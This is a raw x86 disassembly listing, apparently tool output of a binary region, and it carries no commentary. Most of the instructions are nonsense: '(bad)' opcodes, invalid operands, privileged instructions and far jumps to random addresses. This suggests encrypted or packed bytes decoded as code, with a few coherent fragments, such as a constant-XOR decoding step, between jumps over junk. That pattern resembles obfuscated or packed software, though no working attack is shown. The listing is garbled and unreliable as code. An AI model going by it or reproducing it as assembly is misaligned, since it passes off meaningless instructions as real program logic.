  40bc99:	(bad)  
  40bc9a:	sti    
  40bc9b:	jle    0x40bd1b
  40bc9d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40bca1:	int3   
  40bca2:	inc    eax
  40bca3:	jle    0x40bcbe
  40bca5:	jmp    0x8d79:0x2f575575
  40bcac:	(bad)  
  40bcad:	push   ebp
  40bcae:	ja     0x40bc5e
  40bcb0:	add    ecx,esi
  40bcb2:	int    0x1c
  40bcb4:	fdivr  DWORD PTR [edx-0x714bb5a]
  40bcba:	xchg   edi,eax
  40bcbb:	add    esi,DWORD PTR [ebx-0x6e]
  40bcbe:	mov    esi,0xad47a2d
  40bcc3:	into   
  40bcc4:	sub    esi,ecx
  40bcc6:	pop    edx
  40bcc7:	xor    ebx,edx
  40bcc9:	call   0x14f9:0x6e1573ed
  40bcd0:	cmp    BYTE PTR ds:0x56f6dcfc,ah
  40bcd6:	mov    esp,DWORD PTR [ebp+edi*8-0x1b]
  40bcda:	or     ah,BYTE PTR [ebx-0x3c]
  40bcdd:	xchg   ecx,esi
  40bcdf:	jmp    0xbb558fbf
  40bce4:	jb     0x40bc6e
  40bce6:	push   0xf584e53c
  40bceb:	rep ins BYTE PTR es:[edi],dx
  40bced:	jg     0x40bcae
  40bcef:	wrmsr  
  40bcf1:	call   0x86e48711
  40bcf6:	imul   edi,ebx,0xe5304713
  40bcfc:	mov    BYTE PTR [ebp-0x76],0x82
  40bd00:	popf   
  40bd01:	mov    ebp,0xf6121186
  40bd06:	nop
  40bd07:	rcr    DWORD PTR ds:0xb9801787,cl
  40bd0d:	pop    ds
  40bd0e:	out    0x33,eax
  40bd10:	jl     0x40bd86
  40bd12:	retf   
  40bd13:	dec    esp
  40bd14:	ftst   
  40bd16:	add    BYTE PTR [ecx+0x69],bl
  40bd19:	adc    eax,ebp
  40bd1b:	push   es
  40bd1c:	enter  0x3873,0xda
  40bd20:	hlt    
  40bd21:	pushf  
  40bd22:	ins    BYTE PTR es:[edi],dx
  40bd23:	mov    DWORD PTR [esi*2+0x2808f45f],ecx
  40bd2a:	xor    BYTE PTR [eax],bh
  40bd2c:	push   esp
  40bd2d:	gs sti 
  40bd2f:	stos   DWORD PTR es:[edi],eax
  40bd30:	add    al,0x30
  40bd32:	pop    ss
  40bd33:	dec    ebx
  40bd34:	test   eax,0x41099fb0
  40bd39:	cmp    al,0x81
  40bd3b:	jns    0x40bd8c
  40bd3d:	test   BYTE PTR [ebx],dl
  40bd3f:	mov    edi,0x71fa31b7
  40bd44:	jb     0x40bce8
  40bd46:	mov    ah,0x5e
  40bd48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd49:	add    eax,0x4eab0d66
  40bd4e:	int    0xba
  40bd50:	cld    
  40bd51:	loopne 0x40bcf6
  40bd53:	ds xchg bl,ah
  40bd56:	jge    0x40bd32
  40bd58:	(bad)  
  40bd59:	nop
  40bd5a:	ret    
  40bd5b:	xor    ecx,esp
  40bd5d:	stc    
  40bd5e:	stos   DWORD PTR es:[edi],eax
  40bd5f:	stos   DWORD PTR es:[edi],eax
  40bd60:	push   ebx
  40bd61:	dec    edi
  40bd62:	and    ecx,DWORD PTR [ecx]
  40bd64:	test   BYTE PTR [eax-0x6fe21d06],bh
  40bd6a:	mov    dl,BYTE PTR [ecx+0x68]
  40bd6d:	sub    dl,al
  40bd6f:	jecxz  0x40bd90
  40bd71:	ds jge 0x40bd86
  40bd74:	fwait
  40bd75:	inc    esi
  40bd76:	dec    esi
  40bd77:	pushf  
  40bd78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd79:	xor    dh,BYTE PTR [edi]
  40bd7b:	inc    ecx
  40bd7c:	xchg   DWORD PTR [edx],ecx
  40bd7e:	mul    DWORD PTR ds:0x489b3343
  40bd84:	mov    eax,ds:0x6182f4f0
  40bd89:	cdq    
  40bd8a:	fdivr  DWORD PTR [ebp+0x5f]
  40bd8d:	mov    bl,0xdd
  40bd8f:	mov    edx,0x65f71e39
  40bd94:	mov    ebp,0x22c3bdf4
  40bd99:	push   cs
  40bd9a:	mov    ah,0x7f
  40bd9c:	dec    eax
  40bd9d:	mov    ds:0x35b3f0b4,al
  40bda2:	adc    al,0xe4
  40bda4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bda6:	mov    bl,0x1d
  40bda8:	fld    DWORD PTR [ecx+0x9]
  40bdab:	iret   
  40bdac:	mov    fs,WORD PTR [ebx-0x60]
  40bdaf:	cmp    ah,BYTE PTR [ebx+0x13bf23cf]
  40bdb5:	xor    edi,ecx
  40bdb7:	jb     0x40bd70
  40bdb9:	loop   0x40bded
  40bdbb:	int3   
  40bdbc:	jb     0x40bd44
  40bdbe:	mov    ebx,0xecbf6d1b
  40bdc3:	adc    al,0x1a
  40bdc5:	loope  0x40bd8f
  40bdc7:	into   
  40bdc8:	in     eax,dx
  40bdc9:	imul   eax,DWORD PTR [eax-0x64],0xffffffa8
  40bdcd:	mov    eax,ds:0x638bc571
  40bdd2:	sub    edi,DWORD PTR [edx+eax*2+0x7ff54380]
  40bdd9:	test   BYTE PTR [ecx],dh
  40bddb:	pop    ebx
  40bddc:	and    eax,0x3db1d16b
  40bde1:	mov    dl,0x78
  40bde3:	cld    
  40bde4:	dec    ebp
  40bde5:	aad    0xce
  40bde7:	mov    dh,0x12
  40bde9:	jmp    0x8e4c:0xeb1f15f0
  40bdf0:	add    DWORD PTR [edx+0xa],esp
  40bdf3:	xchg   edi,ebp
  40bdf5:	xchg   edi,eax
  40bdf6:	jp     0x40bda2
  40bdf8:	loopne 0x40be11
  40bdfa:	rcr    BYTE PTR [ecx+0x4acc18fe],1
  40be00:	pop    ss
  40be01:	mov    bl,0x9b
  40be03:	test   DWORD PTR [ebx-0x636e26b1],esi
  40be09:	push   esi
  40be0a:	enter  0x1b71,0x4
  40be0e:	imul   edx,esi,0x908ca44d
  40be14:	mov    ebp,ss
  40be16:	and    DWORD PTR [ecx],edi
  40be18:	repz adc al,0xb1
  40be1b:	cdq    
  40be1c:	lods   eax,DWORD PTR ds:[esi]
  40be1d:	xor    ch,dh
  40be1f:	lahf   
  40be20:	mov    esi,0xb585e916
  40be25:	sbb    al,0x76
  40be27:	push   eax
  40be28:	es ds lahf 
  40be2b:	cmp    DWORD PTR [edi+edi*2],0x767b30f6
  40be32:	fiadd  WORD PTR [eax]
  40be34:	jbe    0x40be9a
  40be36:	pop    ds
  40be37:	pop    edx
  40be38:	retf   
  40be39:	gs push es
  40be3b:	xor    edx,ebx
  40be3d:	inc    edx
  40be3e:	ds ss aaa 
  40be41:	jl     0x40be40
  40be43:	loope  0x40beb0
  40be45:	pop    ebx
  40be46:	push   ds
  40be47:	jnp    0x40be6c
  40be49:	push   edx
  40be4a:	(bad)  
  40be4b:	xor    ebx,DWORD PTR [ebx+eax*4+0x65ad15a9]
  40be52:	adc    al,0xa8
  40be54:	mov    cl,0x53
  40be56:	mov    esp,0xe101d06d
  40be5b:	jae    0x40be84
  40be5d:	cmp    BYTE PTR [ebx-0x52],0x56
  40be61:	adc    ebp,DWORD PTR [eax-0x602430dc]
  40be67:	push   ss
  40be68:	mul    edi
  40be6a:	scas   eax,DWORD PTR es:[edi]
  40be6b:	fisttp QWORD PTR [eax+esi*1+0x2d]
  40be6f:	pop    esi
  40be70:	in     eax,dx
  40be71:	sub    al,0x79
  40be73:	push   ebx
  40be74:	ins    BYTE PTR es:[edi],dx
  40be75:	mov    ebp,0xc8da35be
  40be7a:	inc    esp
  40be7b:	lods   al,BYTE PTR ds:[esi]
  40be7c:	mov    al,ds:0x26b8c154
  40be81:	pop    edx
  40be82:	imul   edx,DWORD PTR [eax+0x22],0x63fc48d5
  40be89:	push   edx
  40be8a:	xchg   edi,eax
  40be8b:	(bad)  [ecx+esi*8+0x64fa215f]
  40be92:	mov    ah,BYTE PTR [edx+0xa]
  40be95:	jo     0x40bef6
  40be97:	xor    DWORD PTR [esi-0x17570cb4],eax
  40be9d:	sub    al,0x30
  40be9f:	(bad)  
  40bea0:	popa   
  40bea1:	mov    ah,0xbb
  40bea3:	and    BYTE PTR [edx+0x6e],ch
  40bea6:	sar    DWORD PTR [ecx+0x3b75218e],1
  40beac:	mov    bl,0xe0
  40beae:	dec    ebx
  40beaf:	adc    cl,dh
  40beb1:	adc    eax,0xde445407
  40beb6:	pop    si
  40beb8:	rcr    DWORD PTR [esi+0x57],1
  40bebb:	mov    ah,0x51
  40bebd:	into   
  40bebe:	ins    BYTE PTR es:[edi],dx
  40bebf:	pop    eax
  40bec0:	inc    ebx
  40bec1:	nop
  40bec2:	mov    eax,0x64671dec
  40bec7:	cmp    BYTE PTR [edi+ebx*8-0x3410e3eb],ah
  40bece:	jae    0x40be7e
  40bed0:	adc    eax,0xea997e20
  40bed5:	shl    ch,0x6a
  40bed8:	add    eax,0xbd7cd373
  40bedd:	inc    edi
  40bede:	scas   al,BYTE PTR es:[edi]
  40bedf:	add    BYTE PTR [esi],cl
  40bee1:	add    DWORD PTR [ecx-0x4a15005],edi
  40bee7:	xor    eax,0x7510854
  40beec:	jmp    0x40b9f2
  40bef1:	mov    eax,DWORD PTR [ebp+0xc]
  40bef4:	add    eax,DWORD PTR [ebp+0x8]
  40bef7:	mov    DWORD PTR [ebp-0x10],eax
  40befa:	mov    eax,DWORD PTR [ebp-0x1c]
  40befd:	test   eax,eax
  40beff:	je     0x40cbbe
  40bf05:	mov    DWORD PTR [ebp-0x24],esi
  40bf08:	push   0xb
  40bf0a:	pop    ecx
  40bf0b:	push   0x5
  40bf0d:	dec    ecx
  40bf0e:	pop    ebx
  40bf0f:	xchg   ebx,ecx
  40bf11:	sub    ebx,ecx
  40bf13:	jmp    0x40c176
  40bf18:	pop    ecx
  40bf19:	jbe    0x69f82f56
  40bf1f:	push   ecx
  40bf20:	scas   eax,DWORD PTR es:[edi]
  40bf21:	or     cl,BYTE PTR [esi+0x37089331]
  40bf27:	dec    esp
  40bf28:	cmp    cl,0x7e
  40bf2b:	jle    0x40bf65
  40bf2d:	jl     0x40bfad
  40bf2f:	jle    0x40bf30
  40bf31:	inc    ebp
  40bf32:	cld    
  40bf33:	jb     0x40beeb
  40bf35:	(bad)  
  40bf36:	mov    eax,ds:0x7230d4c4
  40bf3b:	add    ebp,ebp
  40bf3d:	test   al,0xb5
  40bf3f:	mov    bl,cl
  40bf41:	div    DWORD PTR fs:[eax+0xb93916f]
  40bf48:	sahf   
  40bf49:	cli    
  40bf4a:	repnz inc ebp
  40bf4c:	(bad)  
  40bf4d:	mov    ds:0x8db50758,eax
  40bf52:	cs fwait
  40bf54:	dec    ecx
  40bf55:	inc    ebx
  40bf56:	xchg   edx,eax
  40bf57:	mov    ah,0xa7
  40bf59:	jmp    FWORD PTR [ebx]
  40bf5b:	cmp    eax,0xd8e22d32
  40bf60:	cmp    edx,DWORD PTR [eax+0x7d]
  40bf63:	cs xor eax,0x9358767f
  40bf69:	jae    0x40bf6a
  40bf6b:	lods   eax,DWORD PTR ds:[esi]
  40bf6c:	fsubr  st(5),st
  40bf6e:	or     ch,cl
  40bf70:	mov    al,ds:0xda8bd5f0
  40bf75:	js     0x40bf0b
  40bf77:	mov    ds:0xfab2cfa8,eax
  40bf7c:	(bad)  
  40bf7d:	sub    ch,BYTE PTR [esi]
  40bf7f:	xor    DWORD PTR [edx-0x6c724a2c],esi
  40bf85:	pusha  
  40bf86:	inc    eax
  40bf87:	push   esi
  40bf88:	sbb    bl,dh
  40bf8a:	jp     0x40bf7d
  40bf8c:	adc    eax,0x87d4673d
  40bf91:	adc    DWORD PTR ds:0x6bc4352e,eax
  40bf97:	jle    0x40bf43
  40bf99:	xchg   esi,eax
  40bf9a:	add    cl,BYTE PTR [ecx-0x2ca1f862]
  40bfa0:	dec    esi
  40bfa1:	xchg   esp,eax
  40bfa2:	push   eax
  40bfa3:	(bad)  
  40bfa4:	call   FWORD PTR [esi-0x7b]
  40bfa7:	lds    ebp,FWORD PTR [ebx+eiz*1+0x26]
  40bfab:	daa    
  40bfac:	and    eax,0xe38d4672
  40bfb1:	dec    eax
  40bfb2:	pop    esi
  40bfb3:	cmp    eax,0x5c08f00a
  40bfb8:	cld    
  40bfb9:	jg     0x40bf78
  40bfbb:	inc    ebx
  40bfbc:	dec    edx
  40bfbd:	fst    QWORD PTR [esi-0x33c9421e]
  40bfc3:	inc    esp
  40bfc4:	adc    ch,ch
  40bfc6:	xchg   ebx,eax
  40bfc7:	je     0x40bf6a
  40bfc9:	pop    ebp
  40bfca:	pop    edi
  40bfcb:	aam    0x32
  40bfcd:	sub    DWORD PTR [edi+eiz*1+0x2c],eax
  40bfd1:	xchg   al,al
  40bfd3:	retf   
  40bfd4:	and    ecx,edx
  40bfd6:	std    
  40bfd7:	adc    al,0xd3
  40bfd9:	cli    
  40bfda:	mov    edi,0x7c17a69
  40bfdf:	fnstcw WORD PTR [esi+0x2a]
  40bfe2:	shr    BYTE PTR [ebx],0xd9
  40bfe5:	mov    DWORD PTR [ebx+0x340a4e86],eax
  40bfeb:	dec    esi
  40bfec:	xlat   BYTE PTR ds:[ebx]
  40bfed:	add    BYTE PTR [edi-0x49],bh
  40bff0:	daa    
  40bff1:	lock xchg edx,eax
  40bff3:	mov    fs,WORD PTR [esi-0x27309408]
  40bff9:	jmp    0x40bfdf
  40bffb:	adc    eax,0xb2de197c
  40c000:	jb     0x40c016
  40c002:	push   ebp
  40c003:	push   cs
  40c004:	adc    ah,BYTE PTR [esi+0x3beba5ee]
  40c00a:	mov    esp,0xa1167a86
  40c00f:	hlt    
  40c010:	sbb    BYTE PTR [edx-0x6f71941e],0xf
  40c017:	cld    
  40c018:	xchg   ecx,eax
  40c019:	push   ecx
  40c01a:	inc    eax
  40c01b:	cmc    
  40c01c:	cmp    al,0xf6
  40c01e:	fistp  QWORD PTR [eax+0x4]
  40c021:	add    al,0xda
  40c023:	jge    0x40c083
  40c025:	cmp    ebx,esi
  40c027:	in     al,dx
  40c028:	jno    0x40c042
  40c02a:	repz mov esi,DWORD PTR [ebx]
  40c02d:	mov    ecx,0xaf6df748
  40c032:	sbb    eax,0x2619f729
  40c037:	test   al,0xa6
  40c039:	pop    esi
  40c03a:	repnz dec ebp
  40c03c:	es xchg edi,eax
  40c03e:	mov    ecx,0xbc6a2da5
  40c043:	and    al,0xbf
  40c045:	cmc    
  40c046:	or     cl,bh
  40c048:	adc    ecx,DWORD PTR [eax-0x6deb0ba]
  40c04e:	mov    BYTE PTR [esi+0x18d282e6],dl
  40c054:	fdivr  QWORD PTR [ebp+eax*8-0x7a]
  40c058:	push   edx
  40c059:	mov    ds,WORD PTR [ebx-0x46]
  40c05c:	xchg   ebp,eax
  40c05d:	out    dx,al
  40c05e:	mov    ecx,0x2927679
  40c063:	mov    al,ds:0xa627bf54
  40c068:	lods   eax,DWORD PTR ds:[esi]
  40c069:	push   0x63
  40c06b:	fdiv   st,st(5)
  40c06d:	and    DWORD PTR [ebx-0x17],esi
  40c070:	std    
  40c071:	lds    esi,FWORD PTR [edx]
  40c073:	or     al,BYTE PTR [ecx+esi*4]
  40c076:	clc    
  40c077:	cmp    bl,ch
  40c079:	lds    edi,FWORD PTR [esi+ecx*1]
  40c07c:	jmp    0x40c0f6
  40c07e:	stos   DWORD PTR es:[edi],eax
  40c07f:	jg     0x40c0e1
  40c081:	mov    edi,edi
  40c083:	dec    edx
  40c084:	gs cdq 
  40c086:	stos   BYTE PTR es:[edi],al
  40c087:	mov    bl,0xee
  40c089:	ss pop ds
  40c08b:	ins    BYTE PTR es:[edi],dx
  40c08c:	add    ch,ch
  40c08e:	dec    ebp
  40c08f:	js     0x40c05c
  40c091:	(bad)  
  40c092:	std    
  40c093:	addr16 pop ds
  40c095:	loopne 0x40c0fa
  40c097:	ja     0x40c069
  40c099:	push   eax
  40c09a:	call   0x21d3:0xe9ed33b
  40c0a1:	mov    dl,0x5f
  40c0a3:	lods   eax,DWORD PTR ds:[esi]
  40c0a4:	add    eax,0xe7142bfb
  40c0a9:	ret    
  40c0aa:	aad    0x68
  40c0ac:	mov    bh,BYTE PTR [ebp+0x464b6aa6]
  40c0b2:	dec    esp
  40c0b3:	add    al,0xd
  40c0b5:	cmp    BYTE PTR [edi-0x64cb80e5],bh
  40c0bb:	push   cs
  40c0bc:	inc    eax
  40c0bd:	shl    DWORD PTR [ebx+0x7aa2bd1c],0xb8
  40c0c4:	retf   0x372f
  40c0c7:	sub    eax,0x9bd6b666
  40c0cc:	gs inc edx
  40c0ce:	jbe    0x40c0ef
  40c0d0:	xchg   edi,eax
  40c0d1:	xchg   ecx,eax
  40c0d2:	pop    ds
  40c0d3:	mov    ebx,0xecf14cd5
  40c0d8:	xchg   BYTE PTR [edi-0x4b3d7bc7],dh
  40c0de:	sar    BYTE PTR [ebx],0x80
  40c0e1:	inc    ebx
  40c0e2:	shl    BYTE PTR [ebx+0x5],cl
  40c0e5:	fisub  WORD PTR [ecx]
  40c0e7:	outs   dx,DWORD PTR ds:[esi]
  40c0e8:	ins    DWORD PTR es:[edi],dx
  40c0e9:	sub    esi,DWORD PTR [edi+esi*4]
  40c0ec:	inc    esp
  40c0ed:	mov    al,ds:0x2f9c4793
  40c0f2:	pop    esi
  40c0f3:	lods   eax,DWORD PTR ds:[esi]
  40c0f4:	inc    esi
  40c0f5:	and    bl,bh
  40c0f7:	cmp    BYTE PTR [eax-0x7b],bh
  40c0fa:	test   al,0x6d
  40c0fc:	shr    DWORD PTR [ebx-0x19],cl
  40c0ff:	imul   eax,eax,0xecef2638
  40c105:	pop    eax
  40c106:	inc    esp
  40c107:	inc    edx
  40c108:	inc    eax
  40c109:	jne    0x40c0f8
  40c10b:	mov    al,0xd
  40c10d:	fdivr  QWORD PTR [eax-0x584a70f3]
  40c113:	fadd   QWORD PTR [edi]
  40c115:	je     0x40c104
  40c117:	and    ebx,DWORD PTR [ecx+0x60]
  40c11a:	enter  0x65ed,0xe0
  40c11e:	div    DWORD PTR [eax]
  40c120:	jns    0x40c13f
  40c122:	scas   al,BYTE PTR es:[edi]
  40c123:	adc    BYTE PTR [eax-0x26],0xcf
  40c127:	das    
  40c128:	inc    edi
  40c129:	(bad)  
  40c12a:	pop    esi
  40c12b:	popa   
  40c12c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c12d:	mov    al,ds:0xbfb69c13
  40c132:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c133:	mov    dh,0x6a
  40c135:	and    al,0xd
  40c137:	xchg   esp,eax
  40c138:	enter  0x80ad,0xe1
  40c13c:	pop    esi
  40c13d:	pop    esp
  40c13e:	and    BYTE PTR [esi],0xd1
  40c141:	sub    dh,BYTE PTR [ecx+0x43]
  40c144:	bound  eax,QWORD PTR [ebp-0xa]
  40c147:	shr    DWORD PTR [ebp+0x29],cl
  40c14a:	and    al,0x45
  40c14c:	stos   DWORD PTR es:[edi],eax
  40c14d:	mov    esp,DWORD PTR [ebx-0x44]
  40c150:	adc    BYTE PTR [ecx+0x77],bh
  40c153:	fst    QWORD PTR [edi-0x758d57f7]
  40c159:	jns    0x40c1d7
  40c15b:	push   ebx
  40c15c:	fimul  DWORD PTR [ecx-0x73]
  40c15f:	pop    ss
  40c160:	fwait
  40c161:	mov    ecx,0xb93fb310
  40c166:	lock out dx,al
  40c168:	jg     0x40c1ae
  40c16a:	ror    DWORD PTR [edi],0xf9
  40c16d:	jnp    0x40c1ad
  40c16f:	rcl    DWORD PTR [edx],1
  40c171:	inc    ebp
  40c172:	mov    bh,0xd7
  40c174:	fild   QWORD PTR [edx-0x74b63479]
  40c17a:	inc    ebp
  40c17b:	in     al,0xf
  40c17d:	scas   eax,DWORD PTR es:[edi]
  40c17e:	shr    DWORD PTR [ebx],0xe0
  40c181:	mov    DWORD PTR [ebp-0x24],esp
  40c184:	jmp    0x40c3e7
  40c189:	dec    ebx
  40c18a:	loop   0x40c1d9
  40c18c:	lds    esi,FWORD PTR [ebp+0x71]
  40c18f:	push   ebx
  40c190:	jo     0x40c117
  40c192:	mov    cl,0xee
  40c194:	sub    al,0xc2
  40c196:	outs   dx,DWORD PTR ds:[esi]
  40c197:	mov    esi,ebx
  40c199:	dec    edx
  40c19a:	xchg   DWORD PTR [esi+0x7e],edi
  40c19d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c1a1:	sub    bh,BYTE PTR [edi+0x370e991b]
  40c1a7:	mov    cl,0x90
  40c1a9:	leave  
  40c1aa:	and    eax,0x49e281d8
  40c1af:	sbb    bl,BYTE PTR ds:0x24d48b6
  40c1b5:	jnp    0x40c22a
  40c1b7:	xchg   DWORD PTR [edx+ecx*2+0x73c747b4],eax
  40c1be:	adc    ebx,esp
  40c1c0:	jg     0x40c182
  40c1c2:	mov    ds:0xf2665adb,eax
  40c1c7:	les    ecx,FWORD PTR [edx-0x56b31216]
  40c1cd:	ret    
  40c1ce:	aas    
  40c1cf:	fs fucom st(0)
  40c1d2:	outs   dx,DWORD PTR ds:[esi]
  40c1d3:	and    al,BYTE PTR [edi+0x2563cbef]
  40c1d9:	mov    eax,ds:0xb08d49e5
  40c1de:	or     DWORD PTR [eax-0x5d],0xffffffa0
  40c1e2:	mov    eax,ds:0xcfb64b00
  40c1e7:	jbe    0x40c23e
  40c1e9:	shl    ah,cl
  40c1eb:	and    dl,ch
  40c1ed:	das    
  40c1ee:	fucomi st,st(3)
  40c1f0:	sbb    ebx,DWORD PTR [edx+0x2]
  40c1f3:	or     eax,0x2a399dcb
  40c1f8:	sahf   
  40c1f9:	sbb    al,0x38
  40c1fb:	rcr    DWORD PTR [eax+0x5f],1
  40c1fe:	(bad)  
  40c1ff:	add    DWORD PTR es:[eax+0x5e],eax
  40c203:	adc    DWORD PTR [ecx+0x31c5a840],esi
  40c209:	or     eax,0x3852b480
  40c20e:	add    al,0xb2
  40c210:	cli    
  40c211:	out    dx,al
  40c212:	mov    dh,bl
  40c214:	mov    esp,0x42804cba
  40c219:	mov    dh,0x4c
  40c21b:	jno    0x40c27d
  40c21d:	adc    BYTE PTR [edi],0xd5
  40c220:	pop    ss
  40c221:	lahf   
  40c222:	cli    
  40c223:	in     al,0x8a
  40c225:	lods   eax,DWORD PTR ds:[esi]
  40c226:	xchg   DWORD PTR [edi+0x0],ebp
  40c229:	xlat   BYTE PTR ds:[ebx]
  40c22a:	push   edx
  40c22b:	popw   ds
  40c22d:	and    edx,edi
  40c22f:	neg    dh
  40c231:	adc    BYTE PTR [ebp-0x7e54b8fb],cl
  40c237:	xor    dh,ah
  40c239:	loop   0x40c2b7
  40c23b:	inc    eax
  40c23c:	jl     0x40c1ff
  40c23e:	fldln2 
  40c240:	outs   dx,BYTE PTR ds:[esi]
  40c241:	jno    0x40c1f9
  40c243:	inc    edx
  40c244:	fisubr WORD PTR [edi+0x51]
  40c247:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c248:	pop    ebx
  40c249:	add    al,0x98
  40c24b:	mov    ecx,0xb76def47
  40c250:	mov    ?,edx
  40c252:	adc    eax,0xd41346a7
  40c257:	cs ja  0x40c24e
  40c25a:	aas    
  40c25b:	or     DWORD PTR [ecx],ebp
  40c25d:	ja     0x40c294
  40c25f:	mov    ebx,0x2ef77fe0
  40c264:	and    ecx,DWORD PTR [eiz*4-0x708288ea]
  40c26b:	enter  0x6744,0x33
  40c26f:	in     al,dx
  40c270:	cmp    eax,0x8b83b9c6
  40c275:	or     esi,ebx
  40c277:	cmp    BYTE PTR [ebp+0x93267b1],dl
  40c27d:	mov    ebp,0xc75ccd2
  40c282:	mov    dl,0xa1
  40c284:	jmp    0x19246878
  40c289:	jbe    0x40c2de
  40c28b:	rcr    BYTE PTR [eax-0x7ffa826d],0x7b
  40c292:	leave  
  40c293:	div    dl
  40c295:	in     eax,dx
  40c296:	fisttp WORD PTR [ebx]
  40c298:	push   eax
  40c299:	call   0xcc80:0x3c302d05
  40c2a0:	test   DWORD PTR [ebx],eax
  40c2a2:	mov    dh,0x5f
  40c2a4:	test   DWORD PTR [ebx+0x2a],0xdaf13c69
  40c2ab:	xchg   esp,eax
  40c2ac:	pop    esi
  40c2ad:	mov    ds:0x2cdbf0b2,al
  40c2b2:	xor    edi,eax
  40c2b4:	add    DWORD PTR [ebp-0x2d],ebx
  40c2b7:	cmp    al,0x74
  40c2b9:	es iret 
  40c2bb:	or     eax,0xfa2a9485
  40c2c0:	mov    ebp,0x2befc8bc
  40c2c5:	adc    ebp,ebx
  40c2c7:	xlat   BYTE PTR ds:[ebx]
  40c2c8:	adc    edi,DWORD PTR [edx+edx*2+0x6f]
  40c2cc:	repnz arpl dx,bp
  40c2cf:	loopne 0x40c347
  40c2d1:	test   al,0xd2
  40c2d3:	jl     0x40c2fd
  40c2d5:	cdq    
  40c2d6:	in     eax,dx
  40c2d7:	sbb    eax,0xf9c91a00
  40c2dc:	ins    DWORD PTR es:[edi],dx
  40c2dd:	push   ebx
  40c2de:	aas    
  40c2df:	mov    edi,0x43a38218
  40c2e4:	sub    ebp,DWORD PTR [ebp+0x5cfd2b02]
  40c2ea:	fstp   QWORD PTR [eax]
  40c2ec:	mov    edi,edx
  40c2ee:	inc    eax
  40c2ef:	in     al,0x2a
  40c2f1:	pop    ss
  40c2f2:	mov    eax,ds:0xa75e67de
  40c2f7:	xchg   ebx,eax
  40c2f8:	call   0xd48f:0x3fca76ba
  40c2ff:	in     eax,dx
  40c300:	xor    al,0x65
  40c302:	sub    al,BYTE PTR [ecx]
  40c304:	ds cmc 
  40c306:	sub    eax,0xc6704abd
  40c30b:	mov    ?,WORD PTR [edx]
  40c30d:	xchg   ecx,eax
  40c30e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c30f:	xchg   edx,eax
  40c310:	fisub  DWORD PTR [edi+0x6c]
  40c313:	bound  edi,QWORD PTR [esi]
  40c315:	mov    al,0x23
  40c317:	in     eax,0xbd
  40c319:	pop    ss
  40c31a:	cwde   
  40c31b:	imul   ebx,DWORD PTR [edi-0x79],0x93878f84
  40c322:	stos   BYTE PTR es:[edi],al
  40c323:	shr    BYTE PTR [edx+ebx*1-0x39],1
  40c327:	xchg   ebp,eax
  40c328:	inc    edx
  40c329:	nop
  40c32a:	push   ebx
  40c32b:	enter  0xc8f4,0x98
  40c32f:	ins    BYTE PTR es:[edi],dx
  40c330:	addr16 mov edi,0x75977e8f
  40c336:	fbstp  TBYTE PTR [ebx+0x6f]
  40c339:	gs pop ebx
  40c33b:	ret    
  40c33c:	jae    0x40c2cd
  40c33e:	add    ebx,DWORD PTR [edi-0x5]
  40c341:	mov    bh,0x80
  40c343:	das    
  40c344:	add    al,0xb0
  40c346:	int3   
  40c347:	repz mov ecx,0xf700ef21
  40c34d:	neg    DWORD PTR [esi+0x46]
  40c350:	or     al,0x64
  40c352:	mov    bl,0xbd
  40c354:	xor    bl,BYTE PTR [esi+0x23]
  40c357:	ss ret 0x38b6
  40c35b:	jl     0x40c2f5
  40c35d:	das    
  40c35e:	(bad)  
  40c35f:	xor    bh,BYTE PTR [ecx+0x197fcbfc]
  40c365:	jmp    DWORD PTR [edx-0x7809c43f]
  40c36b:	inc    edi
  40c36c:	cmp    DWORD PTR [ebx],edx
  40c36e:	test   DWORD PTR [esi],eax
  40c370:	cmp    edi,DWORD PTR [ebp+0x14113eb]
  40c376:	nop
  40c377:	iret   
  40c378:	icebp  
  40c379:	shl    DWORD PTR [eax+ecx*2+0x5d],1
  40c37d:	inc    ebx
  40c37e:	jmp    DWORD PTR [edx+0x51]
  40c381:	(bad)  
  40c383:	data16 daa 
  40c385:	pusha  
  40c386:	out    dx,eax
  40c387:	enter  0xb4cd,0xe2
  40c38b:	es sbb dh,ah
  40c38e:	scas   al,BYTE PTR es:[edi]
  40c38f:	xor    eax,0x5290dc5f
  40c394:	not    BYTE PTR [ebx]
  40c396:	faddp  st(6),st
  40c398:	sub    eax,eax
  40c39a:	sub    ecx,DWORD PTR [ebp+0x4]
  40c39d:	and    ah,BYTE PTR [eax]
  40c39f:	add    cl,BYTE PTR [bp+di-0x653b]
  40c3a4:	ret    0x37a0
  40c3a7:	dec    ebp
  40c3a8:	or     esi,DWORD PTR [edx]
  40c3aa:	push   edx
  40c3ab:	xchg   esp,eax
  40c3ac:	adc    DWORD PTR ds:0xc92e07fe,esp
  40c3b2:	retf   
  40c3b3:	push   0x30736170
  40c3b8:	xchg   ebx,eax
  40c3b9:	retf   
  40c3ba:	pop    esp
  40c3bb:	inc    eax
  40c3bc:	add    ecx,0xfffffff0
  40c3bf:	cmp    edx,edi
  40c3c1:	lds    ecx,FWORD PTR [ebp+0x10]
  40c3c4:	sbb    BYTE PTR [edx+0x4951d3eb],ah
  40c3ca:	shl    DWORD PTR [eax],cl
  40c3cc:	ja     0x40c36e
  40c3ce:	aam    0x9e
  40c3d0:	jbe    0x40c38f
  40c3d2:	sub    DWORD PTR [eax],0x1db6aa98
  40c3d8:	mov    eax,ds:0x6e460a0b
  40c3dd:	lahf   
  40c3de:	jns    0x40c38a
  40c3e0:	inc    ebx
  40c3e1:	pushf  
  40c3e2:	hlt    
  40c3e3:	int    0x7c
  40c3e5:	int3   
  40c3e6:	retf   
  40c3e7:	mov    eax,DWORD PTR [ebp-0x4]
  40c3ea:	mov    ecx,0x7510854
  40c3ef:	xor    eax,ecx
  40c3f1:	mov    edx,0x32729b
  40c3f6:	add    eax,edx
  40c3f8:	mov    DWORD PTR [ebp+0x8],eax
  40c3fb:	mov    eax,DWORD PTR [ebp-0x18]
  40c3fe:	xor    eax,ecx
  40c400:	add    eax,edx
  40c402:	mov    edx,DWORD PTR [ebp+0x14]
  40c405:	imul   eax,DWORD PTR [edx]
  40c408:	mov    edx,DWORD PTR [ebp-0x4]
